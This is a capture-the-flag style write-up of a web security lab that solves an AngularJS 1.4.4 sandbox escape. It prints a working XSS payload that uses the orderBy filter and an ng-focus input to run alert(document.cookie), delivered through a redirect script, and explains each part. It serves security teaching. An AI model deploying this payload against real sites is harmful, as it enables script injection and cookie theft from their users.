## Solution steps

- Enter any random string in the search box.
- Right-click the page and select View Page Source.
- Look for the AngularJS library: `<script type="text/javascript" src="/resources/js/angular_1-4-4.js"></script>`
- Navigate to `/resources/js/angular_1-4-4.js` and observe the version of AngularJS: `AngularJS v1.4.4`
- AngularJS version 1.4.4 is known to be vulnerable to a sandbox escape using the `orderBy` filter, which can lead to arbitrary code execution within Angular's expression context.
- Go to their exploit server and paste the following code:
  ```html
  <script>
  location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
  </script>
- Click "Store" and "Deliver exploit to victim" to solve the lab.

### How it works

- `location = ...` - This just redirects the browser to a crafted URL with a malicious payload in the search query parameter.
- `?search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x`:
  - AngularJS is interpreting the input attribute `ng-focus` as a directive. `ng-focus` means: “run this AngularJS expression when the input gains focus.
  - `$event.composedPath()`: we use it to produce some array-like value to pass through Angular’s filters. It is safe and allowed inside the AngularJS sandbox.
  - `orderBy` is a built-in AngularJS filter. It tries to sort the array using a custom expression.
  - `'(z=alert)(document.cookie)'`: This is where the sandbox is escaped. AngularJS (before version 1.6) had a known sandbox bypass via `orderBy:`, allowing code execution inside that string.
  - `(z=alert)` assigns `alert` to `z`, and then `(document.cookie)` calls `z(document.cookie)` -> effectively becomes `alert(document.cookie)`.
  - The `#x` scrolls the page to the input with `id="x"` and automatically focuses it. That triggers the `ng-focus` event -> AngularJS evaluates the expression -> sandbox escape -> `alert(document.cookie)` runs.
